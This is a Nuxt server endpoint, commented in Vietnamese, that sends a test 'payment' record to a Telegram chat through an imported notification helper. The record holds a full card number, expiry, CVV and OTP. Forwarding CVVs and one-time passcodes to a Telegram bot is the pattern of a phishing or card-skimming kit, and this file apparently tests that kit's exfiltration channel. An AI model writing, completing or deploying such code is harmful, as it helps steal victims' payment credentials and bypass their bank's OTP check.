import { sendTelegramNotification, getTelegramConfig } from '~/server/utils/telegram';

export default defineEventHandler(async (event) => {
    if (event.node.req.method !== 'POST') {
        throw createError({
            statusCode: 405,
            statusMessage: 'Method Not Allowed'
        });
    }

    try {
        // Kiểm tra cấu hình Telegram
        const config = await getTelegramConfig();
        if (!config || !config.bot_token || !config.chat_id) {
            throw createError({
                statusCode: 400,
                statusMessage: 'Telegram configuration not found or incomplete'
            });
        }

        // Tạo test payment data
        const testPayment = {
            id: 999999,
            method: 'VISA',
            card_number: '4111 1111 1111 1111',
            cardholder_name: 'TEST USER',
            expiry: '12/25',
            cvv: '123',
            otp: '123456',
            status: 'pending',
            created_at: new Date().toISOString()
        };

        console.log('🧪 DEBUG: Sending test Telegram notification');

        // Gửi test notification
        const success = await sendTelegramNotification(testPayment, true);

        if (success) {
            return {
                success: true,
                message: 'Test Telegram notification sent successfully!'
            };
        } else {
            throw createError({
                statusCode: 500,
                statusMessage: 'Failed to send test Telegram notification'
            });
        }
    } catch (error: any) {
        console.error('🚨 DEBUG: Error in test Telegram API:', error);

        // Trả về thông báo lỗi chi tiết hơn
        if (error.statusCode === 400) {
            throw createError({
                statusCode: 400,
                statusMessage: error.statusMessage || 'Telegram configuration not found or incomplete'
            });
        }

        throw createError({
            statusCode: 500,
            statusMessage: 'Failed to send Telegram notification. Please check your bot token and chat ID.'
        });
    }
});
